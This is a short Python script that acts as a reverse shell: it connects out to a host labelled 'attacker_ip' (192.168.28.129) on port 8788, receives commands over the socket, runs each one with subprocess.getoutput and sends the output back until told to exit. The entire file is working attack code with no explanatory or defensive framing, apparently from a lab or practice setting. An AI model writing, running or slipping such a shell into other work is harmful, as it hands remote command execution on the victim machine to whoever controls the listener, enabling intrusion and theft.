import socket
import subprocess

if __name__ == '__main__':
    attacker_ip = "192.168.28.129"
    attacker_port = 8788

    attacker_address = (attacker_ip, attacker_port)

    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    client_socket.connect(attacker_address)

    print(f"Client Connecting to: {attacker_ip}:{attacker_port}")

    while True:
        command = client_socket.recv(1024).decode()

        if command.lower() == "exit":
            break

        output = subprocess.getoutput(command)
        client_socket.send(output.encode())

    client_socket.close()
